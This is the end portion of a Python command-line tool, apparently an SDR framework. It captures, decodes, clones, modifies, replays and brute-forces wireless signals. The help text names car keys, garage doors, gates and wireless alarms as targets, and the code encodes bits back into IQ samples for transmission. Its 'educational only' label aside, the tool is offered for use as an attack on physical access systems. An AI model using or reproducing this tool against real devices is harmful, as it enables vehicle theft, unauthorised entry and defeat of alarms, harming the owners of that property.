            print("\n[✓] Brute force complete!")
    
    def _encode_bits_to_iq(self, bits: str, baud_rate: int, 
                          encoding: str, modulation: str) -> np.ndarray:
        """
        Encode bits back to IQ samples for transmission
        """
        samples_per_bit = self.sample_rate // baud_rate
        
        # Apply encoding
        if encoding == "PWM":
            signal = []
            short_width = samples_per_bit // 3
            long_width = samples_per_bit * 2 // 3
            
            for bit in bits:
                if bit == '0':
                    signal.extend([1.0] * short_width)
                    signal.extend([0.0] * (samples_per_bit - short_width))
                else:
                    signal.extend([1.0] * long_width)
                    signal.extend([0.0] * (samples_per_bit - long_width))
        
        elif encoding == "Manchester":
            signal = []
            half_bit = samples_per_bit // 2
            for bit in bits:
                if bit == '0':
                    signal.extend([1.0] * half_bit)
                    signal.extend([0.0] * half_bit)
                else:
                    signal.extend([0.0] * half_bit)
                    signal.extend([1.0] * half_bit)
        
        else:  # NRZ
            signal = []
            for bit in bits:
                if bit == '0':
                    signal.extend([0.0] * samples_per_bit)
                else:
                    signal.extend([1.0] * samples_per_bit)
        
        # Convert to IQ (ASK modulation)
        iq_samples = np.array(signal, dtype=np.complex64)
        
        return iq_samples


def main():
    parser = argparse.ArgumentParser(
        description="Universal RF Reverse Engineering Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Universal tool for analyzing ANY wireless device:
  • Car keys (rolling & fixed codes)
  • Garage doors
  • Gate controllers
  • Wireless alarms
  • Remote controls
  • Power outlets
  • Doorbells
  • Pagers
  • Smart home devices

Examples:
  # Capture and analyze unknown device
  python3 universal_rf.py --capture --freq 433.92
  
  # Replay captured signal
  python3 universal_rf.py --replay capture.iq --freq 433.92
  
  # Interactive mode with explanation
  python3 universal_rf.py --capture --freq 315.0 --explain
  
  # Clone and modify signal
  python3 universal_rf.py --capture --freq 433.92 --modify
  
  # Brute force fixed code
  python3 universal_rf.py --capture --freq 433.92 --brute-force

"Kepada Tuhan Kita Berserah" - EDUCATIONAL/RESEARCH ONLY
        """
    )
    
    parser.add_argument('--capture', action='store_true',
                       help='Capture and analyze signal')
    parser.add_argument('--replay', type=str,
                       help='Replay IQ file')
    parser.add_argument('--freq', type=float, required=True,
                       help='Frequency in MHz (e.g., 315.0, 433.92)')
    parser.add_argument('--duration', type=float, default=2.0,
                       help='Capture duration in seconds')
    parser.add_argument('--explain', action='store_true',
                       help='Interactive bit-by-bit explanation')
    parser.add_argument('--modify', action='store_true',
                       help='Modify and retransmit signal')
    parser.add_argument('--brute-force', action='store_true',
                       help='Brute force attack')
    parser.add_argument('--clone', action='store_true',
                       help='Clone signal from decoded bits')
    parser.add_argument('--repeat', type=int, default=1,
                       help='Repeat transmission N times')
    parser.add_argument('--output', type=str, default='capture.iq',
                       help='Output filename')
    
    args = parser.parse_args()
    
    # Initialize tool
    freq_hz = int(args.freq * 1e6)
    tool = UniversalRFTool(frequency=freq_hz)
    
    if args.capture:
        # Capture and analyze
        decoded = tool.capture_and_decode(args.duration, args.output)
        
        if not decoded:
            return 1
        
        # Save analysis
        analysis_file = args.output.replace('.iq', '_analysis.json')
        with open(analysis_file, 'w') as f:
            json.dump(asdict(decoded), f, indent=2, default=str)
        print(f"[✓] Analysis saved to {analysis_file}\n")
        
        # Explain if requested
        if args.explain:
            SignalExplainer.explain_signal(decoded, interactive=True)
        
        # Modify if requested
        if args.modify:
            tool.modify_and_send(decoded)
        
        # Brute force if requested
        if args.brute_force:
            tool.brute_force_attack(decoded)
        
        # Clone if requested
        if args.clone:
            tool.clone_signal(decoded, "cloned.iq")
    
    elif args.replay:
        # Simple replay
        tool.replay_signal(args.replay, repeat=args.repeat)
    
    else:
        parser.print_help()
        return 1
    
    return 0


if __name__ == "__main__":
    sys.exit(main())
